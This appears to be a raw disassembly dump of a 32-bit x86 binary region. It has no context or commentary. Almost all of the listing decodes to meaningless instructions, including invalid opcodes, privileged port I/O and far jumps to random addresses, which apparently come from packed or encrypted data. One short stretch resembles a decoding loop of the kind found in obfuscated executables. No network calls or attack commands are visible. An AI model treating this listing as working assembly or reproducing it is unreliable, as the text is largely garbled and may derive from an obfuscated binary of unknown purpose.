  41e2f6:	sub    ebp,DWORD PTR [ecx+0x23e458a6]
  41e2fc:	push   0x34
  41e2fe:	mov    dl,0xfa
  41e300:	dec    edx
  41e301:	ret    
  41e302:	iret   
  41e303:	(bad)  
  41e304:	fstp   TBYTE PTR [edi]
  41e306:	mov    bl,0xb4
  41e308:	repz jg 0x41e2b9
  41e30b:	lea    edx,[eax+0xa]
  41e30e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e30f:	mov    edi,0xcf913634
  41e314:	cmp    ch,dh
  41e316:	les    esp,FWORD PTR [ebx+0x10a9c58b]
  41e31c:	add    ecx,DWORD PTR [eax+ecx*1]
  41e31f:	js     0x41e396
  41e321:	mov    bl,0x7c
  41e323:	sub    al,0x28
  41e325:	jb     0x41e382
  41e327:	ins    DWORD PTR es:[edi],dx
  41e328:	imul   esp,DWORD PTR [esi+0x74],0xfffffff5
  41e32c:	or     DWORD PTR [ebx],edi
  41e32e:	(bad)  
  41e330:	push   ebx
  41e331:	out    dx,eax
  41e332:	scas   al,BYTE PTR es:[edi]
  41e333:	rcr    ah,cl
  41e335:	push   ss
  41e336:	xor    ch,al
  41e338:	or     DWORD PTR [edi],ebx
  41e33a:	ficomp WORD PTR [ebx-0x4ee15548]
  41e340:	and    bl,al
  41e342:	shl    DWORD PTR [esi],0xc5
  41e345:	(bad)  
  41e346:	push   edi
  41e347:	jmp    0xcb25:0xf69db803
  41e34e:	cld    
  41e34f:	mov    esi,0xda9d0a40
  41e354:	fnstenv [ecx-0x8]
  41e357:	pop    edx
  41e358:	dec    edx
  41e359:	in     eax,0x6e
  41e35b:	xor    ah,ch
  41e35d:	pop    esp
  41e35e:	jl     0x41e2e4
  41e360:	daa    
  41e361:	and    al,0x68
  41e363:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e364:	or     bh,BYTE PTR [eax]
  41e366:	aas    
  41e367:	pushf  
  41e368:	and    BYTE PTR [ecx],ah
  41e36a:	into   
  41e36b:	cmp    eax,0x4bea8b9f
  41e370:	das    
  41e371:	or     eax,0x4fead717
  41e376:	push   ebp
  41e377:	pop    edx
  41e378:	jb     0x41e2fb
  41e37a:	cdq    
  41e37b:	cli    
  41e37c:	mov    ds:0xba0a17f6,eax
  41e381:	sar    BYTE PTR [edi+eax*4],1
  41e384:	cli    
  41e385:	ja     0x41e355
  41e387:	or     dl,BYTE PTR [edi+ebx*2]
  41e38a:	fwait
  41e38b:	je     0x41e34f
  41e38d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e38e:	add    ecx,DWORD PTR ds:[ebp-0x16]
  41e392:	dec    ebp
  41e393:	add    eax,0x7ab2e34e
  41e398:	push   ds
  41e399:	mov    edi,0xbeb99bea
  41e39e:	add    eax,esp
  41e3a0:	pop    esp
  41e3a1:	mov    bh,0x82
  41e3a3:	dec    ecx
  41e3a4:	call   0x6764455d
  41e3a9:	push   0xb58f0a21
  41e3ae:	push   ebx
  41e3af:	sub    bh,bh
  41e3b1:	repnz sahf 
  41e3b3:	out    dx,eax
  41e3b4:	dec    si
  41e3b6:	xor    BYTE PTR [esi-0x601a3617],bh
  41e3bc:	sbb    eax,0x29735199
  41e3c1:	cmp    BYTE PTR ds:0xa0387485,bl
  41e3c7:	pop    ebp
  41e3c8:	imul   ebx,DWORD PTR [ecx+ebp*8+0x1820f9c6],0x5a
  41e3d0:	inc    edi
  41e3d1:	inc    esp
  41e3d2:	int3   
  41e3d3:	mov    edx,edi
  41e3d5:	xchg   esp,eax
  41e3d6:	(bad)  
  41e3d7:	push   esp
  41e3d8:	sub    al,0x43
  41e3da:	dec    ecx
  41e3db:	mov    eax,0x5ef4cfeb
  41e3e0:	inc    esp
  41e3e1:	outs   dx,DWORD PTR ds:[esi]
  41e3e2:	stos   BYTE PTR es:[edi],al
  41e3e3:	(bad)  
  41e3e4:	adc    eax,0x557fc136
  41e3e9:	int    0x85
  41e3eb:	or     eax,0x7ca3a94a
  41e3f0:	lods   eax,DWORD PTR ds:[esi]
  41e3f1:	push   edx
  41e3f2:	mov    eax,ds:0x2f2222f8
  41e3f7:	adc    BYTE PTR [ecx+eax*1-0x40e7b9e],bh
  41e3fe:	aad    0x9
  41e400:	push   esi
  41e401:	inc    ebx
  41e402:	mov    eax,DWORD PTR [eax]
  41e404:	cs out 0x42,al
  41e407:	and    edx,DWORD PTR [ecx]
  41e409:	pop    ss
  41e40a:	push   eax
  41e40b:	mov    edi,0x36eefe26
  41e410:	and    ebp,ecx
  41e412:	sahf   
  41e413:	lds    ebx,FWORD PTR ds:0x9fbccdd8
  41e419:	mov    bh,dh
  41e41b:	fnsave [esi-0x38]
  41e41e:	call   0x4f1f1e06
  41e423:	not    DWORD PTR [edi-0x51e73113]
  41e429:	push   0x2a9242eb
  41e42e:	ins    DWORD PTR es:[edi],dx
  41e42f:	or     ch,BYTE PTR [esi-0x5114d872]
  41e435:	js     0x41e3cb
  41e437:	sub    edx,0xffffff87
  41e43a:	(bad)  
  41e43b:	int3   
  41e43c:	mov    gs,WORD PTR [ecx]
  41e43e:	pop    edi
  41e43f:	jle    0x41e484
  41e441:	dec    esp
  41e442:	inc    edi
  41e443:	cmp    bh,BYTE PTR [esi+0x6e]
  41e446:	int3   
  41e447:	cmp    al,0x8d
  41e449:	xchg   ebp,ebp
  41e44b:	push   es
  41e44c:	shl    DWORD PTR [ebp-0x97e1ff],cl
  41e452:	div    BYTE PTR [ebx-0x311de867]
  41e458:	sbb    eax,0x4d7fb4ba
  41e45d:	loopne 0x41e4a4
  41e45f:	pop    esi
  41e460:	stos   DWORD PTR es:[edi],eax
  41e461:	idiv   DWORD PTR [esi]
  41e463:	inc    ebp
  41e464:	sbb    ch,BYTE PTR [esi-0xa]
  41e467:	pshufw mm7,mm7,0x45
  41e46b:	js     0x41e411
  41e46d:	aad    0xbc
  41e46f:	(bad)  
  41e470:	and    DWORD PTR [edx-0x2b0fcbd],ecx
  41e476:	pminub mm1,mm7
  41e479:	or     bl,BYTE PTR [ecx]
  41e47b:	retf   
  41e47c:	ss sbb al,0x6d
  41e47f:	mov    eax,0xc02b2b40
  41e484:	dec    esi
  41e485:	test   al,0x62
  41e487:	ret    0x4740
  41e48a:	sbb    al,0x73
  41e48c:	add    al,0x38
  41e48e:	rol    BYTE PTR [edi-0x30],1
  41e491:	repnz xor DWORD PTR [ebp-0x2a],edx
  41e495:	enter  0xda87,0x80
  41e499:	es push eax
  41e49b:	shl    BYTE PTR [esi+0xc],cl
  41e49e:	fdivr  QWORD PTR [edx-0x3]
  41e4a1:	outs   dx,DWORD PTR ds:[esi]
  41e4a2:	inc    eax
  41e4a3:	add    al,0x27
  41e4a5:	pop    edx
  41e4a6:	leave  
  41e4a7:	cmp    BYTE PTR [edi+0xb],bl
  41e4aa:	dec    eax
  41e4ab:	out    0xb1,eax
  41e4ad:	jne    0x41e4e6
  41e4af:	fst    DWORD PTR [esi+0x76]
  41e4b2:	shl    BYTE PTR [edx+0x34b5c07f],0xb2
  41e4b9:	lods   eax,DWORD PTR ds:[esi]
  41e4ba:	test   DWORD PTR [eax-0x28d76d79],esp
  41e4c0:	outs   dx,BYTE PTR ds:[esi]
  41e4c1:	pop    esi
  41e4c2:	lods   eax,DWORD PTR ds:[esi]
  41e4c3:	push   cs
  41e4c4:	cdq    
  41e4c5:	in     al,0xb2
  41e4c7:	push   edi
  41e4c8:	jmp    0x3691:0x9801343
  41e4cf:	repz mov bl,BYTE PTR [eax]
  41e4d2:	fidiv  WORD PTR [eax]
  41e4d4:	loope  0x41e4ca
  41e4d6:	lds    ebx,FWORD PTR [ebx+0x63]
  41e4d9:	cmp    dl,BYTE PTR [esi+ebp*8-0x36f7246d]
  41e4e0:	icebp  
  41e4e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4e2:	out    0xc0,al
  41e4e4:	cmp    al,0xf4
  41e4e6:	mov    edx,0xb589499e
  41e4eb:	jp     0x41e492
  41e4ed:	xchg   esi,eax
  41e4ee:	or     al,0x8d
  41e4f0:	in     al,dx
  41e4f1:	inc    esp
  41e4f2:	cs scas eax,DWORD PTR es:[edi]
  41e4f4:	xchg   ecx,eax
  41e4f5:	xor    eax,0x7db54618
  41e4fa:	mov    ch,0xdd
  41e4fc:	push   ecx
  41e4fd:	jge    0x41e566
  41e4ff:	shld   ebp,edi,0x19
  41e503:	pop    esi
  41e504:	and    edx,DWORD PTR [eax-0x350319c1]
  41e50a:	jmp    0x8ed2:0x8b5d618c
  41e511:	test   BYTE PTR [ebp+edx*2+0x56b09337],dl
  41e518:	and    DWORD PTR [edx+ebx*8-0x47965200],0x41
  41e520:	mov    eax,ds:0x244d4c1f
  41e525:	ret    
  41e526:	rcl    ecx,1
  41e528:	clc    
  41e529:	pop    ecx
  41e52a:	mov    esi,gs
  41e52c:	scas   al,BYTE PTR es:[edi]
  41e52d:	mov    al,ds:0xcbc42c51
  41e532:	mov    edi,0x780d4e8b
  41e537:	popf   
  41e538:	std    
  41e539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e53a:	adc    al,0xeb
  41e53c:	popf   
  41e53d:	sub    eax,0xcc964a3
  41e542:	jg     0x41e521
  41e544:	sbb    eax,0x8180ac2d
  41e549:	push   eax
  41e54a:	mov    ds:0xb943c93c,eax
  41e54f:	pop    ebp
  41e550:	in     eax,dx
  41e551:	push   esp
  41e552:	xor    DWORD PTR [esi],ebp
  41e554:	cmp    ecx,DWORD PTR [edi]
  41e556:	jae    0x41e5ba
  41e558:	pop    esi
  41e559:	enter  0x4e6,0x10
  41e55d:	adc    al,0x8
  41e55f:	das    
  41e560:	dec    eax
  41e561:	mov    esp,0x53f3ed15
  41e566:	pop    esi
  41e567:	addr16 inc edx
  41e569:	stos   BYTE PTR es:[edi],al
  41e56a:	adc    dh,BYTE PTR [esi-0xbdc9c49]
  41e570:	inc    ebx
  41e571:	cwde   
  41e572:	jbe    0x41e5a3
  41e574:	scas   al,BYTE PTR es:[edi]
  41e575:	sub    BYTE PTR [edx+0x27e4d683],ch
  41e57b:	pop    edx
  41e57c:	jl     0x41e5cd
  41e57e:	mov    dh,ch
  41e580:	mov    BYTE PTR [ebx+0x43],al
  41e583:	adc    al,0x15
  41e585:	adc    BYTE PTR [eax],dl
  41e587:	out    dx,eax
  41e588:	retf   
  41e589:	aam    0x2d
  41e58b:	ins    DWORD PTR es:[edi],dx
  41e58c:	das    
  41e58d:	pop    esp
  41e58e:	dec    ebx
  41e58f:	test   DWORD PTR [ecx],0x97c00d18
  41e595:	aad    0xc4
  41e597:	adc    ah,BYTE PTR [esi]
  41e599:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e59a:	or     BYTE PTR [ebx+0x7a],0x38
  41e59e:	inc    DWORD PTR [edi+0x10123e78]
  41e5a4:	mov    ebp,0x46c6d1d0
  41e5a9:	scas   al,BYTE PTR es:[edi]
  41e5aa:	outs   dx,DWORD PTR ss:[esi]
  41e5ac:	sbb    al,0x41
  41e5ae:	outs   dx,BYTE PTR ds:[esi]
  41e5af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5b0:	xchg   ebx,eax
  41e5b1:	or     DWORD PTR [ebp+0x67],0x48
  41e5b5:	mov    eax,DWORD PTR gs:[ebp+0x79d106d2]
  41e5bc:	push   0xffffff9a
  41e5be:	mov    ds:0x71596916,eax
  41e5c3:	dec    eax
  41e5c4:	shl    DWORD PTR [ebx],cl
  41e5c6:	and    edx,ebp
  41e5c8:	pop    esi
  41e5c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5ca:	jle    0x41e5e9
  41e5cc:	retf   0x40ff
  41e5cf:	scas   eax,DWORD PTR es:[edi]
  41e5d0:	push   0x60
  41e5d2:	iret   
  41e5d3:	xor    eax,DWORD PTR [edx]
  41e5d5:	scas   al,BYTE PTR es:[edi]
  41e5d6:	and    DWORD PTR [eax-0x119907f5],ebx
  41e5dc:	sbb    BYTE PTR [edx+eiz*2],bl
  41e5df:	dec    esp
  41e5e0:	xchg   ecx,eax
  41e5e1:	inc    ecx
  41e5e2:	adc    DWORD PTR [edx],edi
  41e5e4:	in     al,0x4b
  41e5e6:	mov    dl,0xed
  41e5e8:	retf   0x2438
  41e5eb:	sub    al,cl
  41e5ed:	lea    esp,[ebx+ecx*4-0xa19b36c]
  41e5f4:	sbb    eax,0x1adf578f
  41e5f9:	outs   dx,BYTE PTR ds:[esi]
  41e5fa:	lea    eax,[edx+0x5f]
  41e5fd:	push   ebx
  41e5fe:	iret   
  41e5ff:	push   esp
  41e600:	cmc    
  41e601:	mov    esp,0xa3af81e
  41e606:	retf   
  41e607:	imul   ecx,DWORD PTR [ecx],0xffffffa6
  41e60a:	cmp    esp,DWORD PTR [ebp+0x382340a8]
  41e610:	adc    al,0x8d
  41e612:	dec    BYTE PTR [esi+0x2f]
  41e615:	inc    ebp
  41e616:	dec    di
  41e618:	mov    esi,0x7009e8fa
  41e61d:	test   BYTE PTR [esi+0x7f],ah
  41e620:	lea    eax,[esi]
  41e622:	xchg   edx,eax
  41e623:	ss pop es
  41e625:	in     al,0x5c
  41e627:	(bad)  
  41e628:	fidiv  DWORD PTR [ebp+0xea783e9]
  41e62e:	ffreep st(1)
  41e630:	add    al,0x8e
  41e632:	out    0x90,al
  41e634:	pop    ss
  41e635:	xchg   edx,eax
  41e636:	retf   
  41e637:	(bad)  
  41e638:	popf   
  41e639:	mov    bl,0x5d
  41e63b:	(bad)  
  41e63d:	ror    DWORD PTR [ecx+0x58ff28ef],cl
  41e643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e644:	fadd   st,st(3)
  41e646:	cmp    eax,0x878b1119
  41e64b:	lea    ebp,[edi-0xa]
  41e64e:	inc    ebx
  41e64f:	pop    ss
  41e650:	adc    ch,BYTE PTR [ecx]
  41e652:	enter  0xc6a9,0x4
  41e656:	lods   eax,DWORD PTR ds:[esi]
  41e657:	cs pop esi
  41e659:	mov    bh,0x68
  41e65b:	call   0xcc2d:0xdda24fb6
  41e662:	stos   BYTE PTR es:[edi],al
  41e663:	arpl   WORD PTR [eax+0x16c250c0],bx
  41e669:	ins    DWORD PTR es:[edi],dx
  41e66a:	xchg   esp,eax
  41e66b:	ret    0xb8db
  41e66e:	or     eax,0x85e657fe
  41e673:	scas   al,BYTE PTR es:[edi]
  41e674:	ror    BYTE PTR [esi],1
  41e676:	adc    ch,0x2b
  41e679:	(bad)  
  41e67a:	retf   
  41e67b:	push   eax
  41e67c:	fisubr DWORD PTR [edx+ebp*1+0x6b]
  41e680:	sbb    eax,0xe1180637
  41e685:	gs ds hlt 
  41e688:	dec    esi
  41e689:	psadbw mm7,QWORD PTR [edi+edx*2]
  41e68d:	mov    bh,0xb0
  41e68f:	pop    ecx
  41e690:	dec    edi
  41e691:	ficomp DWORD PTR [esi+0x34f30cd1]
  41e697:	jmp    0x41e700
  41e699:	retf   0xc57c
  41e69c:	pop    esp
  41e69d:	mov    ss,WORD PTR [ebx+0x1d]
  41e6a0:	or     eax,0xa2acc3b6
  41e6a5:	inc    esi
  41e6a6:	jecxz  0x41e700
  41e6a8:	push   edx
  41e6a9:	iret   
  41e6aa:	push   esp
  41e6ab:	inc    esp
  41e6ac:	xor    al,0xa6
  41e6ae:	scas   eax,DWORD PTR es:[edi]
  41e6af:	fist   WORD PTR [edi+ebp*1-0x41]
  41e6b3:	sar    BYTE PTR [esi+0x63aed4fd],0x1a
  41e6ba:	aam    0x55
  41e6bc:	dec    ebx
  41e6bd:	mov    eax,0xf68db6ae
  41e6c2:	dec    ebp
  41e6c3:	aaa    
  41e6c4:	or     eax,0xda7ed4dc
  41e6c9:	push   ecx
  41e6ca:	mov    BYTE PTR [eax-0x68],ah
  41e6cd:	test   DWORD PTR [eax+0x30],0x2ecf94ab
  41e6d4:	xor    BYTE PTR [ebp+0x412b92d8],al
  41e6da:	push   ecx
  41e6db:	call   0x93da6467
  41e6e0:	dec    ebx
  41e6e1:	mov    al,ds:0xedc4701c
  41e6e6:	add    eax,0x37064e55
  41e6eb:	mov    ebx,ecx
  41e6ed:	out    dx,eax
  41e6ee:	jmp    0x41e762
  41e6f0:	jo     0x41e6fb
  41e6f2:	pop    ss
  41e6f3:	inc    ecx
  41e6f4:	(bad)  
  41e6f5:	gs dec ebp
  41e6f7:	call   0xf363:0xd18ce24f
  41e6fe:	int    0x87
  41e700:	dec    esi
  41e701:	mov    edi,eax
  41e703:	popf   
  41e704:	lock push esi
  41e706:	stos   DWORD PTR es:[edi],eax
  41e707:	push   esp
  41e708:	test   eax,0x47618d4e
  41e70d:	add    esp,ecx
  41e70f:	nop
  41e710:	cld    
  41e711:	outs   dx,DWORD PTR ds:[esi]
  41e712:	addr16 into 
  41e714:	jne    0x41e77c
  41e716:	xor    al,0x68
  41e718:	aad    0xdb
  41e71a:	mov    ch,0xc
  41e71c:	mov    WORD PTR [ecx+0x3e88b113],?
  41e722:	mov    dl,0x90
  41e724:	leave  
  41e725:	out    0x90,eax
  41e727:	push   ss
  41e728:	add    DWORD PTR ds:0x924eb4fd,esi
  41e72e:	dec    ebp
  41e72f:	mov    al,0xb3
  41e731:	or     al,0x46
  41e733:	push   0x7d77381a
  41e738:	out    0xc,eax
  41e73a:	add    bl,BYTE PTR [ebx+0x7]
  41e73d:	mov    ch,0x40
  41e73f:	xor    ch,BYTE PTR [eax]
  41e741:	int3   
  41e742:	in     al,0x26
  41e744:	std    
  41e745:	and    eax,0xe62ca445
  41e74a:	inc    esp
  41e74b:	push   edi
  41e74c:	cmp    ebp,edi
  41e74e:	jg     0x41e7a5
  41e750:	add    esp,DWORD PTR [esi+0x9dba0b1]
  41e756:	inc    edx
  41e757:	(bad)  
  41e758:	sbb    eax,0xeea43640
  41e75d:	pop    es
  41e75e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e75f:	jecxz  0x41e774
  41e761:	ins    DWORD PTR es:[edi],dx
  41e762:	mov    al,ds:0xc9b39198
  41e767:	mov    al,0xc7
  41e769:	ror    BYTE PTR [ebp+ecx*4+0x11],cl
  41e76d:	sahf   
  41e76e:	adc    eax,0x96cecf1d
  41e773:	outs   dx,DWORD PTR ds:[esi]
  41e774:	sub    DWORD PTR [eax-0x4987fbd0],0x14bc4351
  41e77e:	out    0xbf,al
  41e780:	cmp    BYTE PTR [eax+ebp*1],cl
  41e783:	sahf   
  41e784:	daa    
  41e785:	mov    eax,0x8f24aa7b
  41e78a:	mov    BYTE PTR [ebx],bh
  41e78c:	inc    edi
  41e78d:	lods   eax,DWORD PTR ds:[esi]
  41e78e:	push   edx
  41e78f:	jp     0x41e77d
  41e791:	mov    bl,0x5c
  41e793:	call   0xa6cf:0xcd8139c4
  41e79a:	es aad 0xcc
  41e79d:	lahf   
  41e79e:	sub    edi,DWORD PTR [ebx]
  41e7a0:	inc    ecx
  41e7a1:	cli    
  41e7a2:	mov    ebp,DWORD PTR [esi-0x43514eb7]
  41e7a8:	jnp    0x41e7b3
  41e7aa:	sub    ecx,DWORD PTR [edi-0x41d0ddc2]
  41e7b0:	add    al,0x9
  41e7b2:	add    DWORD PTR [ebp+0x0],ebx
  41e7b5:	push   0xffffffa3
  41e7b7:	ret    0x3bee
  41e7ba:	push   di
  41e7bc:	push   ss
  41e7bd:	js     0x41e7f7
  41e7bf:	mul    BYTE PTR [edi]
  41e7c1:	cli    
  41e7c2:	je     0x41e74e
  41e7c4:	call   0xd78f:0xb4aae589
  41e7cb:	xchg   esi,eax
  41e7cc:	scas   eax,DWORD PTR es:[edi]
  41e7cd:	mov    ds:0x5c31a509,al
  41e7d2:	shr    DWORD PTR [ebp-0x41],0xb4
  41e7d6:	add    DWORD PTR [edx-0x2c],0xe853ff74
  41e7dd:	rcr    DWORD PTR [ecx-0x3526c6a5],cl
  41e7e3:	loop   0x41e7ae
  41e7e5:	nop
  41e7e6:	out    0x53,ax
  41e7e9:	fisttp WORD PTR [eax-0x3729db27]
  41e7ef:	out    dx,al
  41e7f0:	mov    al,ds:0x6f1b6d2
  41e7f5:	jg     0x41e7bb
  41e7f7:	jle    0x41e7af
  41e7f9:	xchg   dl,bl
  41e7fb:	push   eax
  41e7fc:	std    
  41e7fd:	aam    0x28
  41e7ff:	inc    edi
  41e800:	sub    DWORD PTR [ebx-0x7dfa4681],edx
  41e806:	stos   BYTE PTR es:[edi],al
  41e807:	(bad)  
  41e808:	ror    ch,cl
  41e80a:	cmc    
  41e80b:	ss jmp 0x4b9a:0x66b72b85
  41e813:	imul   ecx,DWORD PTR [edi],0x45
  41e816:	pop    ss
  41e817:	(bad)
  41e81a:	xchg   ebp,eax
  41e81b:	cmp    eax,0x69e9e965
  41e820:	neg    BYTE PTR [esi+0x14]
  41e823:	stos   DWORD PTR es:[edi],eax
  41e824:	jl     0x41e7e7
  41e826:	bound  esp,QWORD PTR [edx+0x24ddb212]
  41e82c:	(bad)  [ebx]
  41e82e:	ret    
  41e82f:	std    
  41e830:	pop    ss
  41e831:	mov    WORD PTR [edi+0x23],es
  41e834:	dec    edi
  41e835:	jp     0x41e889
  41e837:	std    
  41e838:	mov    al,ds:0x5fa93464
  41e83d:	mov    bl,0x3
  41e83f:	add    dh,ch
  41e841:	sbb    al,0xbc
  41e843:	adc    eax,0xf6f2bfd3
  41e848:	fwait
  41e849:	jbe    0x41e8bf
  41e84b:	clc    
  41e84c:	stos   DWORD PTR es:[edi],eax
  41e84d:	push   0x75
  41e84f:	and    BYTE PTR [eax+0xeda29f4],al
  41e855:	pop    edx
  41e856:	scas   al,BYTE PTR es:[edi]
  41e857:	retf   0xde9e
  41e85a:	fmul   QWORD PTR [ecx+0x3d]
  41e85d:	mov    cl,0x53
  41e85f:	icebp  
  41e860:	sbb    eax,0x13b12013
  41e865:	sub    bh,BYTE PTR [esi+ecx*1+0x3b]
  41e869:	popa   
  41e86a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e86b:	icebp  
  41e86c:	inc    ecx
  41e86d:	cli    
  41e86e:	push   ebx
  41e86f:	aad    0x69
  41e871:	dec    edx
  41e872:	adc    BYTE PTR [ecx+0x1c],dh
  41e875:	push   ss
  41e876:	adc    al,0x6b
  41e878:	cli    
  41e879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e87a:	sbb    DWORD PTR ds:0x10ffc2f7,edi
  41e880:	leave  
  41e881:	xchg   ecx,eax
  41e882:	xchg   edx,eax
  41e883:	mov    DWORD PTR [ebp+0x2a891d41],edx
  41e889:	sub    BYTE PTR [edi],dl
  41e88b:	and    BYTE PTR [ecx-0x577e5d6e],bl
  41e891:	sbb    eax,0xc43de12c
  41e896:	xchg   DWORD PTR [eax+0x3],ecx
  41e899:	pop    edx
  41e89a:	add    BYTE PTR [edi+0x22],bl
  41e89d:	push   esp
  41e89e:	stos   DWORD PTR es:[edi],eax
  41e89f:	push   0x7e8533f6
  41e8a4:	xor    eax,0xfb2f8f1a
  41e8a9:	push   esi
  41e8aa:	dec    edi
  41e8ab:	shr    DWORD PTR [eax-0x11],0x30
  41e8af:	retf   0x31ff
  41e8b2:	cmc    
  41e8b3:	hlt    
  41e8b4:	cmp    eax,0xbeed715
  41e8b9:	in     eax,dx
  41e8ba:	mov    ecx,0xe5648756
  41e8bf:	hlt    
  41e8c0:	jbe    0x41e8cf
  41e8c2:	dec    esi
  41e8c3:	cmp    DWORD PTR [edx-0x5c],esp
  41e8c6:	ret    0x4ddf
  41e8c9:	dec    ebp
  41e8ca:	ds xchg edi,eax
  41e8cc:	and    DWORD PTR [esi+0x53],ebx
  41e8cf:	dec    ecx
  41e8d0:	shr    BYTE PTR [ebx],0x4e
  41e8d3:	mov    ds:0xf14fc766,al
  41e8d8:	(bad)  
  41e8d9:	in     eax,0x9
  41e8db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8dc:	nop
  41e8dd:	icebp  
  41e8de:	mov    dl,0x7d
  41e8e0:	mov    bh,0xb6
  41e8e2:	xchg   ecx,eax
  41e8e3:	add    eax,ebx
  41e8e5:	rol    DWORD PTR [esi+edx*1-0x6d5d5ef9],1
  41e8ec:	in     eax,dx
  41e8ed:	xor    cl,ah
  41e8ef:	and    ebx,DWORD PTR [esi-0x5d67f26c]
  41e8f5:	jecxz  0x41e8c9
  41e8f7:	fist   DWORD PTR [ecx-0xf4563fd]
  41e8fd:	pop    edi
  41e8fe:	fidiv  WORD PTR [esi]
  41e900:	xchg   edi,eax
  41e901:	dec    ebp
  41e902:	xor    BYTE PTR [ecx+0x332828b4],bh
  41e908:	cdq    
  41e909:	xchg   esi,eax
  41e90a:	hlt    
  41e90b:	mov    ds:0xad2d8c7c,eax
  41e910:	in     eax,dx
  41e911:	add    al,0x1a
  41e913:	lods   al,BYTE PTR ds:[esi]
  41e914:	es iret 
  41e916:	jp     0x41e8f7
  41e918:	call   0x38dccff5
  41e91d:	cmp    edi,0xcc81e563
  41e923:	fstp   QWORD PTR [edx]
  41e925:	push   0xffffffde
  41e927:	in     al,dx
  41e928:	and    cl,BYTE PTR [edi+0x78]
  41e92b:	sbb    DWORD PTR [ecx],ebx
  41e92d:	pop    esp
  41e92e:	loopne 0x41e8c5
  41e930:	mov    edx,0x6640a812
  41e935:	(bad)  
  41e936:	xor    al,0xc9
  41e938:	jbe    0x41e973
  41e93a:	dec    ebp
  41e93b:	mov    ebp,0xd3df7681
  41e940:	pop    ecx
  41e942:	push   ecx
  41e943:	fst    QWORD PTR [eax+0x3e68174b]
  41e949:	test   eax,0xd0337a9d
  41e94e:	add    ecx,esi
  41e950:	add    edx,esi
  41e952:	cmp    ecx,edx
  41e954:	jae    0x420d77
  41e95a:	lea    edx,[ecx-0x3272dd]
  41e960:	mov    DWORD PTR [ebp-0x18],edx
  41e963:	mov    edi,DWORD PTR [ebp-0x18]
  41e966:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  41e96d:	lea    edx,[ebp-0x24]
  41e970:	mov    DWORD PTR [ebp-0x10],edx
  41e973:	mov    edx,DWORD PTR [ebp-0x10]
  41e976:	add    DWORD PTR [edx],0x705fa0f
  41e97c:	mov    ebx,DWORD PTR [ebp-0x10]
  41e97f:	xor    edi,eax
  41e981:	add    edi,DWORD PTR [ebx]
  41e983:	lea    edx,[ebp+ecx*4-0x64]
  41e987:	mov    ebx,DWORD PTR [edx]
  41e989:	jmp    0x420d16
  41e98e:	add    ebx,DWORD PTR [esi]
  41e990:	(bad)  
  41e991:	jnp    0x41e95a
  41e993:	jnp    0x41e988
  41e995:	jbe    0x41e9c3
  41e997:	cs fld DWORD PTR es:[edx-0x71ddd751]
  41e99f:	ret    0x7a7d
  41e9a2:	or     bl,BYTE PTR [edi+0x7a]
  41e9a5:	jp     0x41e9fb
  41e9a7:	fldenv [eax+0x45b33161]
  41e9ad:	xor    BYTE PTR [eax],0xd3
  41e9b0:	inc    edx
  41e9b1:	out    0x91,eax
  41e9b3:	jmp    0x57635475
  41e9b8:	outs   dx,BYTE PTR ds:[esi]
  41e9b9:	jb     0x41e9a2
  41e9bb:	sub    al,0x9b
  41e9bd:	xchg   esi,eax
  41e9be:	fsub   st,st(6)
  41e9c0:	leave  
  41e9c1:	push   0x2b36f013
  41e9c6:	daa    
  41e9c7:	pushf  
  41e9c8:	push   cs
  41e9c9:	pop    ds
  41e9ca:	mov    edi,0xe9261eb
  41e9cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9d0:	sub    al,0xdc
  41e9d2:	test   eax,0x6d36b3e5
  41e9d7:	pop    eax
  41e9d8:	lods   eax,DWORD PTR ds:[esi]
  41e9d9:	xchg   ebp,eax
  41e9da:	les    ebp,FWORD PTR [ebp-0x3bd3d249]
  41e9e0:	ret    0x6beb
  41e9e3:	aaa    
  41e9e4:	(bad)
  41e9e7:	sub    DWORD PTR [edx-0x3b],ebx
  41e9ea:	pop    esp
  41e9eb:	arpl   WORD PTR [esi-0x31],si
  41e9ee:	and    DWORD PTR [ebp-0x40],0x21d04a7a
  41e9f5:	inc    esp
  41e9f6:	into   
  41e9f7:	push   esp
  41e9f8:	mov    ds:0x4e81956,al
  41e9fd:	and    DWORD PTR [ecx],0x69
  41ea00:	sub    bl,BYTE PTR [edi+0x39]
  41ea03:	and    dl,ch
  41ea05:	jo     0x41ea80
  41ea07:	call   0xafee9508
  41ea0c:	and    esp,edi
  41ea0e:	or     ch,al
  41ea10:	mov    BYTE PTR [eax+0x63],dh
  41ea13:	mov    ch,0x1f
  41ea15:	fwait
  41ea16:	jnp    0x41ea72
  41ea18:	xchg   edi,esp
  41ea1a:	and    BYTE PTR [ecx-0x6e11095c],dl
  41ea20:	sub    BYTE PTR [edx-0x5a],bl
  41ea23:	mov    ecx,edx
  41ea25:	mov    dl,0xcf
  41ea27:	out    dx,al
  41ea28:	pop    esi
  41ea29:	sbb    edi,DWORD PTR [ebp+0x54bb96b4]
  41ea2f:	ret    0x9551
  41ea32:	xor    al,0x6f
  41ea34:	retf   0xa6f
  41ea37:	data16 mov al,ds:0x49a8bf6
  41ea3d:	test   al,0x3
  41ea3f:	push   ecx
  41ea40:	jo     0x41e9d6
  41ea42:	sbb    BYTE PTR [edi-0x6320fe60],0x5a
  41ea49:	cwde   
  41ea4a:	jmp    0x159704c9
  41ea4f:	push   edx
  41ea50:	pushf  
  41ea51:	stc    
  41ea52:	rol    BYTE PTR [ecx+eiz*2-0x31],1
  41ea56:	xchg   ebp,eax
  41ea57:	out    0xd5,eax
  41ea59:	ror    BYTE PTR [ecx-0x42d4dabd],cl
  41ea5f:	mov    gs,ebx
  41ea61:	sub    edx,DWORD PTR [eax-0x4f]
  41ea64:	mov    ecx,0xa9f65fcc
